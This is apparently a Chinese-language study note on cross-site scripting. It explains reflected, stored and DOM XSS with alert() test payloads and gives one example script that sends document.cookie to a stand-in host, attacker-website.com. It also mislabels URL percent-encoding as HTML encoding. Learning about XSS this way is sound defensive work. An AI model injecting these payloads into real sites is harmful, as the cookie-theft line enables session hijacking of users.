### XSS 原理

利用不安全輸入，讓使用者傳回惡意JavaScript。

例如
```
<script>alert('XSS');</script>
```

將上面這一段插入網址後面，如果有出現alert，代表存在XSS
```
https://example.com/id=<script>alert('XSS');</script>
```

你可能覺得阿就一個aler而已，有什麼威脅嗎?如果我們將他換成偷使用者cookie呢?
```
<script>
  // 建立一個假的圖片物件，它的 src 會將受害者的 cookie 傳送到攻擊者的伺服器
  new Image().src = "http://attacker-website.com/steal?cookie=" + document.cookie;
</script>
```

補充:以往我們要驗證XSS，大多使用alert，但是chrome從92版（2021 年 7 月 20 日）開始，禁止iframe呼叫alert() 

### 反射型 XSS（Reflected XSS）
指不會被儲存在資料庫中，而是由網頁後端直接嵌入由前端使用者所傳送過來的內容造成的，最常見的就是以 GET 方法傳送資料給伺服器時，伺服器未檢查就將內容回應到網頁上所產生的漏洞。

```
    <script>alert(1);</script>
    <img src=1 onerror=alert(1)>
```

### 儲存型 XSS（Stored XSS）
攻擊的方式是將Javascript儲存在伺服器的資料庫中，進而引起使User遭受攻擊。
最常見的例子就是將Javascript注入留言板，當下一位User瀏覽網頁時，網頁會載入留言板的 Javascript 進而使 User 受到攻擊

或是`document.write`的

### DOM XSS
這種手法和反射型XSS一樣，都需要使用社交工程釣魚的技巧，點擊URL攻擊才會生效。
差別是需要URL輸入DOM物件，把物件嵌入網頁程式碼

```
    "><svg onload=alert(1)>
```

DOM : 文件物件模型(Document Object Model)，它是一個網頁的程式介面，提供了一個樹狀結構的表示方法，例如:`<html>、<body>、<h1>`等
例:`document.getElementById("id");`，假設`<h1 id="greet"></h1>`，使用者可以任意輸入控制id的值，沒有過過濾，就會發生DOM XSS



三種XSS攻擊中，DOM型XSS和另外兩種XSS的區別是DOM型XSS攻擊中，提取和執行惡意程式都是由瀏覽器端完成，屬於前端JavaScript的安全漏洞，而其他兩種 XSS 都是因為伺服器而產生的安全風險。

### HTML Encode
為了避免特殊符號造成的顯示問題，以及避免HTML將URL中的特殊符號視為語法而產生的編碼，範例如下：
```
<script>alert(1);</script> 
```
會被轉換成
```
%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
```
